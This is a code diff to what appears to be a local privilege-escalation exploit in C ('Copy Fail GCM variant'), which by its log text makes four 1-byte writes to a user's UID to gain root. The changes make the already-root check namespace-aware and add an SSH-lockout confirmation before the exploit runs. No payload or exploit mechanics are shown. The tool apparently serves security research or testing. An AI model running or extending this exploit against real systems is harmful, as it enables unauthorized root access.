@@ -424,12 +424,13 @@ df_result_t copyfail_gcm_exploit(bool do_shell)
 {
     log_step("Copy Fail GCM variant — exploit");
 
-    if (getuid() == 0) {
-        log_warn("already root");
+    uid_t target_uid = real_uid_for_target();
+    if (target_uid == 0) {
+        log_warn("already root in init namespace");
         return DF_OK;
     }
 
-    struct passwd *pw = getpwuid(getuid());
+    struct passwd *pw = getpwuid(target_uid);
     if (!pw) { log_bad("getpwuid: %s", strerror(errno)); return DF_TEST_ERROR; }
     const char *user = pw->pw_name;
 
@@ -449,6 +450,10 @@ df_result_t copyfail_gcm_exploit(bool do_shell)
     log_warn("(four 1-byte writes — one per UID digit not already '0')");
     if (!typed_confirm("DIRTYFAIL")) {
         log_bad("confirmation declined");
+        return DF_OK;
+    }
+    if (!ssh_lockout_check(user)) {
+        log_bad("SSH-lockout confirmation declined — aborting");
         return DF_OK;
     }
 
